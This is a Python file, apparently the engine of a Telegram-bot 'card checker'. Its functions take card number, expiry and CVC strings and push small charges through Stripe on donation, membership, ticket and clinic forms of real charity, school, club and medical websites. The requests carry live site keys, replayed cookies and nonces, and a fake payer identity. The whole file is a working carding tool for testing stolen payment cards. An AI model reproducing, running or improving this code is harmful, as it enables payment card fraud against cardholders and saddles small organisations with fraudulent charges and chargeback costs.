import os,sys
import random
import telebot
import requests,random,time,string,base64
from bs4 import BeautifulSoup
import os,json
import base64
from telebot import types
import time,requests
from re import findall
import user_agent

import re

import requests
import re,json
import random
import time
import string
import base64
from bs4 import BeautifulSoup



import random
import string
import threading
import time

import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()


	headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&billing_details[name]=Vhhjj+nge&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=450dde21-df2a-4445-9015-6b4f1014ede65f3aac&payment_user_agent=stripe.js%2F89f50b7e22%3B+stripe-js-v3%2F89f50b7e22%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=51460&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            '_ga': 'GA1.1.1027315439.1730043864',
            '__stripe_mid': '7d5426db-2192-4323-9eeb-146aa8676b4d905708',
            'charitable_session': '70109c66237872fdeb294b680424a071||86400||82800',
            '_ga_M3WG7TPY0P': 'GS1.1.1730432773.11.1.1730432781.0.0.0',
            '__stripe_sid': '450dde21-df2a-4445-9015-6b4f1014ede65f3aac',
            '_ga_9S894YGECP': 'GS1.1.1730432772.11.1.1730432806.0.0.0',
	}

	headers = {
            'authority': 'needhelped.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_ga=GA1.1.1027315439.1730043864; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; charitable_session=70109c66237872fdeb294b680424a071||86400||82800; _ga_M3WG7TPY0P=GS1.1.1730432773.11.1.1730432781.0.0.0; __stripe_sid=450dde21-df2a-4445-9015-6b4f1014ede65f3aac; _ga_9S894YGECP=GS1.1.1730432772.11.1.1730432806.0.0.0',
            'origin': 'https://needhelped.com',
            'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
	}


	data = {
            'charitable_form_id': '67244f0bd214c',
            '67244f0bd214c': '',
            '_charitable_donation_nonce': 'b68114877f',
            '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
            'campaign_id': '1164',
            'description': 'Poor Children Donation Support',
            'ID': '0',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'Chit',
            'last_name': 'Nge',
            'email': 'saimyataungcr8@gmail.com',
            'address': 'New York',
            'address_2': '',
            'city': 'New York ',
            'state': 'New York',
            'postcode': '10080',
            'country': 'US',
            'phone': '15025659429',
            'gateway': 'stripe',
            'stripe_payment_method': pm,
            'action': 'make_donation',
            'form_action': 'make_donation',
	}
	
	r2 = requests.post(
			'https://needhelped.com/wp-admin/admin-ajax.php',
			cookies=cookies,
			headers=headers,
			data=data,
	).json()
	try:
		ii=r2['errors']
	except:
		return 'success' or 'Thank You'
	return ii
	
	
	
	
	
	

	
	
import requests,re
def Tele2(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51Q9zOoP8CnXsumqaMSligBEuHCOTbbw06EdZ8p0Yvr64Pgi7jDwI8IzHSZZWrsj0atvhQfrCDFuYWslVhgqJWSyH006EBFpwtZ'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            '__stripe_mid': '3d85359e-8d75-414e-9b44-1b5c4412a86152dadf',
            '__stripe_sid': 'e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
	}

	headers = {
            'authority': 'g-pg.com.au',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '__stripe_mid=3d85359e-8d75-414e-9b44-1b5c4412a86152dadf; __stripe_sid=e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
            'origin': 'https://g-pg.com.au',
            'referer': 'https://g-pg.com.au/welcome/repeat-script-requests',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1729922956202',
	}

	data = {
            'data': '__fluent_form_embded_post_id=1138&_fluentform_5_fluentformnonce=a397b837fc&_wp_http_referer=%2Fwelcome%2Frepeat-script-requests&names%5Bfirst_name%5D=Chit&names%5Blast_name%5D=Nge&datetime=21%2F10%2F2000&names_1%5Bfirst_name%5D=Chit&names_1%5Blast_name%5D=Nge&input_text=Tgg&address_1%5Baddress_line_1%5D=New%20York&address_1%5Bcity%5D=New%20York%20&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&numeric-field=1502565942&email=saimyataungcr8%40gmail.com&dropdown=Dr%20Jo%20Centra&message=Cc&datetime_2=03%2F10%2F2024&message_1=Cc&datetime_1=31%2F10%2F2024&payment_input=Standard%20Script%20Request&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
            'action': 'fluentform_submit',
            'form_id': '5',
	}
	
	r2 = requests.post(
			'https://g-pg.com.au/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	).json()
	try:
		ii=r2['errors']
	except:
		return 'success' or 'Your card does not support this type of purchase'
	return ii


import requests,re
def Tele3(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()


	headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=b795a209-45f1-435e-b874-ea306ab190893f5df6&sid=7f450269-c474-451b-818e-23cfb9a4ab592fd69b&payment_user_agent=stripe.js%2F08a843aa09%3B+stripe-js-v3%2F08a843aa09%3B+card-element&referrer=https%3A%2F%2Fhongkongscottish.com&time_on_page=60871&key=pk_live_51F4OGoCvgJYtiJpDUFknw4fFGOsFREy2evbK8vIpfazPKQI7v96SBhLfoJLGe3t9I2mSDY80IRhxK3oZDMuo1X2f00YxU1632R'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            'mailchimp_landing_site': 'https%3A%2F%2Fhongkongscottish.com%2Fsocial-membership%2F',
            '_ga': 'GA1.2.877774477.1730180364',
            'tk_or': '%22%22',
            'tk_r3d': '%22%22',
            'tk_lr': '%22%22',
            '__stripe_mid': 'b795a209-45f1-435e-b874-ea306ab190893f5df6',
            '_gid': 'GA1.2.709542826.1730310312',
            '__stripe_sid': '7f450269-c474-451b-818e-23cfb9a4ab592fd69b',
	}

	headers = {
            'authority': 'hongkongscottish.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fhongkongscottish.com%2Fsocial-membership%2F; _ga=GA1.2.877774477.1730180364; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; __stripe_mid=b795a209-45f1-435e-b874-ea306ab190893f5df6; _gid=GA1.2.709542826.1730310312; __stripe_sid=7f450269-c474-451b-818e-23cfb9a4ab592fd69b',
            'origin': 'https://hongkongscottish.com',
            'referer': 'https://hongkongscottish.com/social-membership/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
	}
	params = {
			't': '1730310374954',
	}

	data = "data=ak_hp_textarea%3D%26ak_js%3D1730310308456%26__fluent_form_embded_post_id%3D42720%26_fluentform_14_fluentformnonce%3Db7633b5c51%26_wp_http_referer%3D%252Fsocial-membership%252F%26names%255Bfirst_name%255D%3DChit%26names%255Blast_name%255D%3DNge%26input_text_1%3DFytd%26email%3Dsaimyataungcr8%2540gmail.com%26phone%3D%252B12015646555%26input_radio_3%3DMale%26datetime%3D21%252F10%252F2000%26input_radio%3Dyes%26address_1%255Baddress_line_1%255D%3DNew%2520York%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DNew%2520York%2520%26address_1%255Bstate%255D%3DNew%2520York%26address_1%255Bzip%255D%3D10080%26address_1%255Bcountry%255D%3DUS%26checkbox_1%255B%255D%3DI%2520agree%2520with%2520the%2520terms%2520of%2520Hong%2520Kong%2520Scottish's%2520%253Ca%2520href%253D%2522https%253A%252F%252Fhongkongscottish.com%252Fwp-content%252Fuploads%252F2019%252F08%252FWebsite-Privacy-Policy.pdf%2522%253EPrivacy%2520Policy%2520%253C%252Fa%253E%2520*%26checkbox_3%255B%255D%3DIn%2520registering%2520for%2520membership%2520for%2520the%2520season%25202024%252F25%252C%2520I%2520understand%2520and%2520accept%2520that%2520membership%2520fees%2520paid%2520are%2520non-refundable%26payment_method%3Dstripe%26payment_input%3D900%26__stripe_payment_method_id%3Dpm_1QFfyECvgJYtiJpDIelHdCO0&action=fluentform_submit&form_id=14"
	
	
	r2 = requests.post(
			'https://hongkongscottish.com/wp-admin/admin-ajax.php',
			cookies=cookies,
			params=params,
			headers=headers,
			data=data,
	).json()
	try:
		ii=r2['errors']
	except:
		return 'success' or 'Thank You'
	return ii
	




import requests,re
def Tele4(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()


	headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7c968580-922b-477b-a253-afa52ce568d5a17b60&sid=f86cb3ae-c054-4ec1-bbfa-b0bc525cc46fd34c12&payment_user_agent=stripe.js%2F647211f3a5%3B+stripe-js-v3%2F647211f3a5%3B+card-element&referrer=https%3A%2F%2Fkeithblakemorenoble.com&time_on_page=42540&key=pk_live_5163VlICVbQePYwnHpC6xQ1wAMi4pO6D6eY2ym3GnZBDInghXWVwsAjN800a1WNhj3KT6isbRTsuSUT0in9jGKMTu00vYpYIGp4'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            'cmplz_saved_categories': '["no_warning"]',
            'cmplz_saved_services': '{}',
            'cmplz_consented_services': '',
            'cmplz_policy_id': '38',
            'cmplz_marketing': 'allow',
            'cmplz_statistics': 'allow',
            'cmplz_preferences': 'allow',
            'cmplz_functional': 'allow',
            'cmplz_id': '91093',
            '__stripe_mid': '7c968580-922b-477b-a253-afa52ce568d5a17b60',
            '__stripe_sid': 'f86cb3ae-c054-4ec1-bbfa-b0bc525cc46fd34c12',
	}

	headers = {
            'authority': 'keithblakemorenoble.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'cmplz_saved_categories=["no_warning"]; cmplz_saved_services={}; cmplz_consented_services=; cmplz_policy_id=38; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_id=91093; __stripe_mid=7c968580-922b-477b-a253-afa52ce568d5a17b60; __stripe_sid=f86cb3ae-c054-4ec1-bbfa-b0bc525cc46fd34c12',
            'origin': 'https://keithblakemorenoble.com',
            'referer': 'https://keithblakemorenoble.com/shop/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1730313434763',
	}

	data = {
            'data': '__fluent_form_embded_post_id=12456&_fluentform_24_fluentformnonce=44f2594fb3&_wp_http_referer=%2Fshop%2F&names_1%5Bfirst_name%5D=Chit&names_1%5Blast_name%5D=Nge&email=saimyataungcr8%40gmail.com&description=&address_1%5Baddress_line_1%5D=New%20York&address_1%5Baddress_line_2%5D=Chg&address_1%5Bcity%5D=New%20York%20&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&phone=15025659429&payment_input=7.50&payment_method=stripe&__entry_intermediate_hash=f0cb8218b468ba9cdcfac13da0773a43&item__24__fluent_checkme_=&payment_input_1%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
            'action': 'fluentform_submit',
            'form_id': '24',
	}
	
	r2 = requests.post(
			'https://keithblakemorenoble.com/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	).json()
	try:
		ii=r2['errors']
	except:
		return 'success' or 'Thank you'
	return ii
	
import requests,re
def Tele6(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()


	headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=19e9917b-2c0e-4e54-b7d1-b8ba9e0c96c9fbd137&sid=690e5b7c-5b65-4a26-82dd-043872da2f568ee8e8&payment_user_agent=stripe.js%2F647211f3a5%3B+stripe-js-v3%2F647211f3a5%3B+card-element&referrer=https%3A%2F%2Fcouleechristian.org&time_on_page=53443&key=pk_live_51JdJczCSVtE2KyCSc2kk3wxMBueqYyH33x9EZdjWz8xPInYepsnrsXoDK7ImzyBNFR6gQKKNL9geLxBAIixkIbZv00FEFkki5B'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            '_ga': 'GA1.1.638243415.1730313906',
            '_clck': '1tb5g3a%7C2%7Cfqg%7C0%7C1764',
            '_clsk': '1vvwdf5%7C1730313908351%7C1%7C1%7Ce.clarity.ms%2Fcollect',
            '__stripe_mid': '19e9917b-2c0e-4e54-b7d1-b8ba9e0c96c9fbd137',
            '__stripe_sid': '690e5b7c-5b65-4a26-82dd-043872da2f568ee8e8',
            '_ga_L94XR99Q9Y': 'GS1.1.1730313906.1.1.1730313959.0.0.0',
	}

	headers = {
            'authority': 'couleechristian.org',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_ga=GA1.1.638243415.1730313906; _clck=1tb5g3a%7C2%7Cfqg%7C0%7C1764; _clsk=1vvwdf5%7C1730313908351%7C1%7C1%7Ce.clarity.ms%2Fcollect; __stripe_mid=19e9917b-2c0e-4e54-b7d1-b8ba9e0c96c9fbd137; __stripe_sid=690e5b7c-5b65-4a26-82dd-043872da2f568ee8e8; _ga_L94XR99Q9Y=GS1.1.1730313906.1.1.1730313959.0.0.0',
            'origin': 'https://couleechristian.org',
            'referer': 'https://couleechristian.org/autumnfundraiser-tickets/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1730313965153',
	}

	data = {
             'data': '__fluent_form_embded_post_id=3389&_fluentform_10_fluentformnonce=9ca57cdb58&_wp_http_referer=%2Fautumnfundraiser-tickets%2F&payment_input=CCS%20Staff%20Ticket&item-quantity=1&email=saimyataungcr8%40gmail.com&input_radio=I%20would%20like%20to%20be%20recognized%20on%20the%20website&description=&names%5Bfirst_name%5D=Chit&names%5Blast_name%5D=Nge&address_1%5Baddress_line_1%5D=New%20York&address_1%5Baddress_line_2%5D=Fg&address_1%5Bcity%5D=New%20York%20&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&phone=15025659429&payment_method=stripe&__entry_intermediate_hash=349f98a1f36e6c9477134d7dc739d55b&__stripe_payment_method_id='+str(pm)+'',
            'action': 'fluentform_submit',
            'form_id': '10',
	}
	
	r2 = requests.post(
			'https://couleechristian.org/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	).json()
	try:
		ii=r2['errors']
	except:
		return 'success' or 'Thank you'
	return ii
	
	
